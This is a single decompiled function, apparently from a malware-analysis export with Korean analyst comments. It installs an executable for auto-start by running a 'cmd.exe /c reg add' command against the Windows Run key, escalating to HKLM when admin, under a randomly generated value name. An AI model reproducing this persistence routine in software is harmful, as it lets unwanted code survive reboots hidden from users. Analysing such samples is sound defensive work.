// --- Metadata ---
// Function Name: autostartViaRegedit_100047F0
// Address: 0x100047F0
// Exported At: 20250522_124045
// Signature: unknown_signature
// ---------------
int __cdecl autostartViaRegedit_100047F0(const char *a1)
{
  char v2[149]; // [esp+8h] [ebp-498h] BYREF 윈도우 부팅 시 자동 실행되도록 레지스트리에 등록 
  __int16 v3; // [esp+9Dh] [ebp-403h]
  char v4; // [esp+9Fh] [ebp-401h]
  char Buffer[1024]; // [esp+A0h] [ebp-400h] BYREF

  strcpy(v2, "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");// 레지스트리 경로 
  if ( IsCurrentProcessAdmin_10001360() )       // 관리자 권한이면 Run 키를 HKLM으로 변경 
  {
    v2[2] = 76;
    v2[3] = 77;
  }
  v2[52] = byte_1000DD98;
  memset(&v2[53], 0, 0x60u);
  v3 = 0;
  v4 = 0;
  GenerateRandomString_100014A0((int)&v2[52]);  // 레지스트리 값 이름 및 실행 파일 경로 지정 
  sprintf(Buffer, "cmd.exe /c reg add %s /v \"%s\" /t REG_SZ /d \"\\\"%s\\\"\" /f", v2, &v2[52], a1);
  return RunProcessWithTimeout_10001080(Buffer, 0x2710u, 0);
}
